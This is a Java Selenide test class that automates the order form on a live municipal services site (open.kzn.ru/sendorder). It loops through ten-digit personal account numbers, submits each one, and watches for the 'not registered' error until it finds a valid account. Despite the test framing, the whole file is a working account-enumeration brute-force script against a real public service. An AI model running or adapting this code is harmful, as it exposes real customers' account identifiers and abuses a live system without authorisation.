package ru.open.kzn.experimental;

import com.codeborne.selenide.SelenideElement;
import com.codeborne.selenide.junit.ScreenShooter;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.openqa.selenium.By;

import java.util.concurrent.TimeUnit;

import static com.codeborne.selenide.Condition.*;
import static com.codeborne.selenide.Selenide.*;

public class SendOrderBruteForsePersonalAccount {

    @Before
    public void SendOrderOpen() {
        open("https://open.kzn.ru/sendorder");
    }

    @Test
    public void SendOrderEmptyPersonalAccount(){

        String companyCode = "810";
        int uniqueCode = 7777777;
        int digitsRequired = 10;
        String error = "Ваш номер лицевого счета не зарегистрирован в базе данных";
        boolean flag = true;

        while (flag) {
            if ((companyCode + uniqueCode).length() != digitsRequired) {
                System.out.println("Personal account must have " + digitsRequired + " digits and you provided "+ (companyCode + uniqueCode).length());
                break;
            }
            String personalAccountGuess = companyCode + uniqueCode;
            $(By.name("personalaccount")).setValue(personalAccountGuess).pressEnter();
            $(By.id("js_nofify")).shouldHave(cssValue("display", "block")).find(By.className("close")).click();
            $(By.name("personalaccount")).pressEnter();
            $(By.id("js_nofify")).find(By.className("text")).shouldHave(text("Ваш номер лицевого счета не зарегистрирован в базе данных."));
            SelenideElement personalAccountError = $(By.id("js_nofify")).shouldHave(cssValue("display", "block")).find(By.className("text"));
            String result = personalAccountError.toString();
            $(By.id("js_nofify")).shouldHave(cssValue("display", "block")).find(By.className("close")).click();
            $(By.name("personalaccount")).clear();
            $(By.name("personalaccount")).pressEnter();
            $(By.id("js_nofify")).find(By.className("text")).shouldHave(text("Необходимо заполнить «Лицевой счёт»."));

            System.out.println(result);

            if (result.contains(error)) {
                System.out.println(personalAccountGuess);
                System.out.println(personalAccountError);

                if ((uniqueCode % 50) == 0) SendOrderOpen();
                uniqueCode--;
            }
            else {
                System.out.println("Found Valid Personal account: " + personalAccountGuess);

                flag = false; }
        }

    }


}
